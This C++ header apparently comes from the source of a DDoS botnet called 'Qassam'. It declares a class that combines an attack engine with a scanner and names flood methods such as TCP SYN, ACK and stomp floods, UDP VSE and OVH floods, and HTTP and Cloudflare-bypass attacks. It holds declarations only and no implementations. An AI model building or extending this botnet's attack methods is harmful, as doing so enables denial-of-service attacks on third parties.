#pragma once

#ifndef QASSAM_QASSAM_ATTACK_METHOD_HH
#define QASSAM_QASSAM_ATTACK_METHOD_HH

#include "../qassam_engine.hh"
#include "../qassam_support.hh"
#include "../scanner/qassam_scanner.hh"



class QassamAttackMethods: public QassamEngine, public QassamSupport, public QassamScanner
{
    public:
        static ipv4_t qassam_get_dns_resolver(void);
        void qassam_attack_app_proxy(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_method_tcpfrag(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_method_tcpstomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_udp_ovhhex(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_method_std(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_method_udpplain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_method_tcp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
        void qassam_attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
};























#endif //QASSAM_QASSAM_ATTACK_METHOD_HH

